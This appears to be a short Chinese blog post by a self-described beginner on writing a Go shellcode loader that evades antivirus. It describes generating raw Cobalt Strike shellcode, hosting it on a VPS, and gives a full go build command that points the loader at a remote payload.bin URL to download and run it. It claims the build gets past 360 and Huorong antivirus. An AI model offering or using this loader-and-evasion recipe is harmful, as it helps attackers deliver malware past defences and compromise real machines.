# go加载器bypass
最近刚开始学习go语言写加载器，参考了几篇文章，利用-race和载荷分离远程下载shellcode编译

1、首先用cs生成raw的shellcode上传到自己的vps服务器上

2、编译：go build -ldflags "-s -w -X main.url=http://xx.xx.xx.xx/payload.bin" -o 1.exe -race shellcode.go

3、虽然VT查杀还是有14，但是截止到目前为止，360与火绒都能过

本人刚开始学习免杀，还很菜，此源码参考了https://github.com/fcre1938/goShellCodeByPassVT/blob/main/main.go,欢迎大佬提出建议
